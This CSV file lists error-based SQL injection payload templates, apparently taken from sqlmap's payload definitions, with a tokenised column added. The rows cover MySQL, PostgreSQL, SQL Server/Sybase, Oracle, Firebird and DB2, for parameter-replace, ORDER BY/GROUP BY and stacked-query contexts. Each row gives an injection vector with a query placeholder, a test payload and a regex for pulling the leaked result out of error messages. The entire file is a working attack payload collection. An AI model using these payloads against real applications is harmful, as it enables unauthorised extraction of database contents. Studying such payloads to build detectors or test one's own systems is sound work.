title,stype,level,risk,clause,where,vector,request/payload,response/grep,details/dbms/0,details/dbms_version,request/comment,details/dbms/1,tokens
MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS),2,5,1,"1,2,3,9",3,"JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))","JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.7.8,,,"['JSON_KEYS', '(', '(', 'SELECT', 'CONVERT', '(', '(', 'SELECT', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ')', 'USING', 'utf8', ')', ')', ')']"
MySQL >= 5.0 error-based - Parameter replace (FLOOR),2,4,1,"1,2,3,9",3,"(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)","(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.0,,,"['(', 'SELECT', '[RANDNUM]', 'FROM', '(', 'SELECT', 'COUNT', '(', '*', ')', ',', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'FLOOR', '(', 'RAND', '(', '0', ')', '*', '2', ')', ')', 'x', 'FROM', 'INFORMATION_SCHEMA.PLUGINS', 'GROUP', 'BY', 'x', ')', 'a', ')']"
MySQL >= 5.1 error-based - Parameter replace (UPDATEXML),2,4,1,"1,2,3,9",3,"(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1]))","(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,,"['(', 'UPDATEXML', '(', '[RANDNUM]', ',', 'CONCAT', '(', ',', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ',', '[RANDNUM1]', ')', ')']"
MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE),2,2,1,"1,2,3,9",3,"(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))","(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,,"['(', 'EXTRACTVALUE', '(', '[RANDNUM]', ',', 'CONCAT', '(', ',', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ')', ')']"
PostgreSQL error-based - Parameter replace,2,2,1,"1,2,3,9",3,(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)),(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],PostgreSQL,,,,"['(', 'CAST', '(', '[DELIMITER_START]', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', 'text', '[DELIMITER_STOP]', 'AS', 'NUMERIC', ')', ')']"
PostgreSQL error-based - Parameter replace (GENERATE_SERIES),2,5,1,"1,2,3,9",3,(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)),"(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],PostgreSQL,,,,"['(', 'CAST', '(', '[DELIMITER_START]', '(', 'SELECT', '1', 'FROM', 'GENERATE_SERIES', '(', '[RANDNUM]', ',', '[RANDNUM]', ',', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', 'LIMIT', '1', ')', 'text', '[DELIMITER_STOP]', 'AS', 'NUMERIC', ')', ')']"
Microsoft SQL Server/Sybase error-based - Parameter replace,2,3,1,"1,3",3,"(CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))","(CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase,"['(', 'CONVERT', '(', 'INT', ',', '(', 'SELECT', '[DELIMITER_START]', '+', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', '+', '[DELIMITER_STOP]', ')', ')', ')']"
Microsoft SQL Server/Sybase error-based - Parameter replace (integer column),2,4,1,"1,3",3,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'),(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase,"['(', 'SELECT', '[DELIMITER_START]', '+', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', '+', '[DELIMITER_STOP]', ')']"
Oracle error-based - Parameter replace,2,3,1,"1,3",3,"(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Oracle,,,,"['(', 'SELECT', 'UPPER', '(', 'XMLType', '(', 'CHR', '(', '60', ')', 'CHR', '(', '58', ')', '[DELIMITER_START]', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', 'FROM', 'DUAL', ')', '[DELIMITER_STOP]', 'CHR', '(', '62', ')', ')', ')', 'FROM', 'DUAL', ')']"
Firebird error-based - Parameter replace,2,4,1,"1,3",3,(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')),(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]')),[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Firebird,,,,"['(', 'SELECT', '[RANDNUM]', '=', '(', '[DELIMITER_START]', '(', 'SELECT', 'CASE', '[RANDNUM]', 'WHEN', '[RANDNUM]', 'THEN', '1', 'ELSE', '0', 'END', 'FROM', 'RDB', 'DATABASE', ')', '[DELIMITER_STOP]', ')', ')']"
IBM DB2 error-based - Parameter replace,2,4,1,"1,3",3,"RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')","RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],IBM DB2,,,,"['RAISE_ERROR', '(', '70001', ',', '[DELIMITER_START]', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', 'FROM', 'SYSIBM.SYSDUMMY1', ')', '[DELIMITER_STOP]', ')']"
"MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)",2,5,1,"2,3",1,",(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)",",(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.5,,,"[',', '(', 'SELECT', '[RANDNUM]', 'FROM', '(', 'SELECT', '2', '*', '(', 'IF', '(', '(', 'SELECT', '*', 'FROM', '(', 'SELECT', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'x', ')', ')', 's', ')', ',', '8446744073709551610', ',', '8446744073709551610', ')', ')', ')', 'x', ')']"
"MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)",2,5,1,"2,3",1,",(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x)))s)",",(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.5,,,"[',', '(', 'SELECT', '[RANDNUM]', 'FROM', '(', 'SELECT', 'EXP', '(', '(', 'SELECT', '*', 'FROM', '(', 'SELECT', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'x', ')', ')', 'x', ')', ')', ')', 's', ')']"
"MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)",2,3,1,"2,3",1,",GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])",",GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.6,,,"[',', 'GTID_SUBSET', '(', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ',', '[RANDNUM]', ')']"
"MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)",2,5,1,"2,3",1,",(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8))))x)",",(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.7.8,,,"[',', '(', 'SELECT', '[RANDNUM]', 'FROM', '(', 'SELECT', 'JSON_KEYS', '(', '(', 'SELECT', 'CONVERT', '(', '(', 'SELECT', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ')', 'USING', 'utf8', ')', ')', ')', ')', 'x', ')']"
"MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)",2,5,1,"2,3",1,",(SELECT 1 FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",",(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.0,,,"[',', '(', 'SELECT', '[RANDNUM]', 'FROM', '(', 'SELECT', 'COUNT', '(', '*', ')', ',', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'FLOOR', '(', 'RAND', '(', '0', ')', '*', '2', ')', ')', 'x', 'FROM', 'INFORMATION_SCHEMA.PLUGINS', 'GROUP', 'BY', 'x', ')', 'a', ')']"
"MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)",2,3,1,"2,3",1,",EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))",",EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,,"[',', 'EXTRACTVALUE', '(', '[RANDNUM]', ',', 'CONCAT', '(', ',', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ')']"
"MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)",2,5,1,"2,3",1,",UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])",",UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 5.1,,,"[',', 'UPDATEXML', '(', '[RANDNUM]', ',', 'CONCAT', '(', ',', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ')', ',', '[RANDNUM1]', ')']"
"MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)",2,5,1,"2,3",1,",(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)",",(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],MySQL,>= 4.1,,,"[',', '(', 'SELECT', '[RANDNUM]', 'FROM', '(', 'SELECT', 'ROW', '(', '[RANDNUM]', ',', '[RANDNUM1]', ')', '(', 'SELECT', 'COUNT', '(', '*', ')', ',', 'CONCAT', '(', '[DELIMITER_START]', ',', '(', 'SELECT', '(', 'ELT', '(', '[RANDNUM]', '=', '[RANDNUM]', ',', '1', ')', ')', ')', ',', '[DELIMITER_STOP]', ',', 'FLOOR', '(', 'RAND', '(', '0', ')', '*', '2', ')', ')', 'x', 'FROM', '(', 'SELECT', '[RANDNUM2]', 'UNION', 'SELECT', '[RANDNUM3]', 'UNION', 'SELECT', '[RANDNUM4]', 'UNION', 'SELECT', '[RANDNUM5]', ')', 'a', 'GROUP', 'BY', 'x', ')', ')', 's', ')']"
"PostgreSQL error-based - ORDER BY, GROUP BY clause",2,3,1,"2,3",1,",(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))",",(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],PostgreSQL,,,,"[',', '(', 'CAST', '(', '[DELIMITER_START]', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', 'text', '[DELIMITER_STOP]', 'AS', 'NUMERIC', ')', ')']"
"PostgreSQL error-based - ORDER BY, GROUP BY clause (GENERATE_SERIES)",2,5,1,"2,3",1,",(CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC))",",(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],PostgreSQL,,,,"[',', '(', 'CAST', '(', '[DELIMITER_START]', '(', 'SELECT', '1', 'FROM', 'GENERATE_SERIES', '(', '[RANDNUM]', ',', '[RANDNUM]', ',', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', 'LIMIT', '1', ')', 'text', '[DELIMITER_STOP]', 'AS', 'NUMERIC', ')', ')']"
Microsoft SQL Server/Sybase error-based - ORDER BY clause,2,4,1,3,1,",(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]')))",",(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,,Sybase,"[',', '(', 'SELECT', '[RANDNUM]', 'WHERE', '[RANDNUM]', '=', 'CONVERT', '(', 'INT', ',', '(', 'SELECT', '[DELIMITER_START]', '+', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', '+', '[DELIMITER_STOP]', ')', ')', ')']"
"Oracle error-based - ORDER BY, GROUP BY clause",2,4,1,"2,3",1,",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)",",(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Oracle,,,,"[',', '(', 'SELECT', 'UPPER', '(', 'XMLType', '(', 'CHR', '(', '60', ')', 'CHR', '(', '58', ')', '[DELIMITER_START]', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', 'FROM', 'DUAL', ')', '[DELIMITER_STOP]', 'CHR', '(', '62', ')', ')', ')', 'FROM', 'DUAL', ')']"
Firebird error-based - ORDER BY clause,2,5,1,3,1,",(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))",",(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Firebird,,,,"[',', '(', 'SELECT', '[RANDNUM]', '=', '(', '[DELIMITER_START]', '(', 'SELECT', 'CASE', '[RANDNUM]', 'WHEN', '[RANDNUM]', 'THEN', '1', 'ELSE', '0', 'END', 'FROM', 'RDB', 'DATABASE', ')', '[DELIMITER_STOP]', ')', ')']"
IBM DB2 error-based - ORDER BY clause,2,5,1,3,1,",RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')",",RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')",[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],IBM DB2,,,,"[',', 'RAISE_ERROR', '(', '70001', ',', '[DELIMITER_START]', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', 'FROM', 'SYSIBM.SYSDUMMY1', ')', '[DELIMITER_STOP]', ')']"
Microsoft SQL Server/Sybase error-based - Stacking (EXEC),2,2,1,1-8,1,;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]');EXEC @[RANDSTR],;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]');EXEC @[RANDSTR],[DELIMITER_START](?P<result>.*?)[DELIMITER_STOP],Microsoft SQL Server,,--,Sybase,"[';', 'DECLARE', '[RANDSTR]', 'NVARCHAR', '(', '4000', ')', ';', 'SET', '[RANDSTR]', '=', '(', 'SELECT', '[DELIMITER_START]', '+', '(', 'SELECT', '(', 'CASE', 'WHEN', '(', '[RANDNUM]', '=', '[RANDNUM]', ')', 'THEN', '1', 'ELSE', '0', 'END', ')', ')', '+', '[DELIMITER_STOP]', ')', ';', 'EXEC', '[RANDSTR]']"
